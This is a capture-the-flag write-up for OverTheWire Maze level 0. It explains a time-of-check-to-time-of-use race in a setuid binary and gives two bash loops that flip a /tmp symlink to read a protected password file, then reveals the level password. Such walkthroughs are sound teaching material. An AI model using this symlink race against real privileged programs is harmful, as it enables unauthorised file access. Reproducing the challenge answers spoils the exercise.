---
date: 2023-09-17 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire Maze Level 0 tutorial!!"
permalink: /posts/overTheWire-Maze-Level-0/
tags: [overthewire, maze, walkthrough, ctf, binary, race-condition, symlink]
description: "A step by step tutorial for OverTheWire Maze Level 0!!"
---

<!-- Scoped styles -->
<style>
  .maze-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .maze-nav .nav-left,.maze-nav .nav-center,.maze-nav .nav-right{flex:1}
  .maze-nav .nav-left{text-align:left}
  .maze-nav .nav-center{text-align:center}
  .maze-nav .nav-right{text-align:right}
  .maze-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .maze-nav a:hover{transform:translateY(-1px)}
  .maze-nav .disabled{opacity:.55}
  :root[data-theme='light'] .maze-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="maze-nav" aria-label="Maze level navigation">
  <div class="nav-left">
    <span class="disabled">Previous: —</span>
  </div>

  <div class="nav-center">
    <a href="https://overthewire.org/wargames/maze/maze0.html" target="_blank" rel="noopener">
      Official Level 0 ↗
    </a>
  </div>

  <div class="nav-right">
    <a href="{{ '/posts/overTheWire-Maze-Level-0-to-1/' | relative_url }}">
      Next: Level 0 → 1 →
    </a>
  </div>
</nav>

## Login

```bash
ssh maze0@maze.labs.overthewire.org -p 2225
# password: maze0
````

Once logged in, you will find the binary **/maze/maze0** and need to exploit it.

![ssh]({{ '/assets/images/maze/level-0/ssh.jpg' | relative_url }})
---

## Task

The program `maze0` checks for a specific file under `/tmp` and prints its contents if accessible.
Decompiled pseudocode (simplified):

```c
int main() {
  char buf[20];
  memset(buf, 0, 20);

  if (access("/tmp/128ecf542a35ac5270a87dc740918404", 4) == 0) {
    int fd = open("/tmp/128ecf542a35ac5270a87dc740918404", 0);
    if (fd < 0) exit(-1);
    read(fd, buf, 19);
    write(1, buf, 19);
  }
  return 0;
}
```

So the program:

1. Checks if `/tmp/128ecf542a35ac5270a87dc740918404` exists and is readable.
2. Opens it and prints its contents.

We want it to read `/etc/maze_pass/maze1`, but `maze0` itself has higher privileges than us.

---

## A little bit of Theory

This is a **TOCTOU (Time-Of-Check-To-Time-Of-Use)** vulnerability, a classic race condition.

* First the program **checks** (`access()`) if the file is readable.
* Then it **opens** the same path.
* If we swap the file between those two steps, we can trick it.

Key idea:

* When `access()` runs, let the symlink point to something we can read.
* Immediately after, flip the symlink to `/etc/maze_pass/maze1`.
* If timed correctly, the `open()` will read the real password file.

---

## Solution

We’ll use two loops in parallel:

**Script 1: spam the vulnerable binary**

```bash
while true; do
    /maze/maze0
done
```

**Script 2: flip the symlink rapidly**

```bash
while true; do
    ln -sf /etc/maze_pass/maze0 /tmp/128ecf542a35ac5270a87dc740918404
    ln -sf /etc/maze_pass/maze1 /tmp/128ecf542a35ac5270a87dc740918404
done
```

Explanation:

* `ln -sf` creates a symbolic link (overwrite if exists).
* We alternate between a file we can read (`maze0`) and the target password file (`maze1`).
* Running both scripts together will eventually hit the right timing.

After a few tries, the program will print the contents of `/etc/maze_pass/maze1`.

**Password obtained:**

```
hashaachon
```

---

## Troubleshooting

* If nothing prints: make sure both loops are running in separate terminals.
* If `/tmp/...` path disappears: just recreate it with `ln -sf`.
* Race conditions are probabilistic — patience is part of the exploit 😉.

---

**Congrats 🎉** You now have the password for **maze1** and can move to the next level.

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})

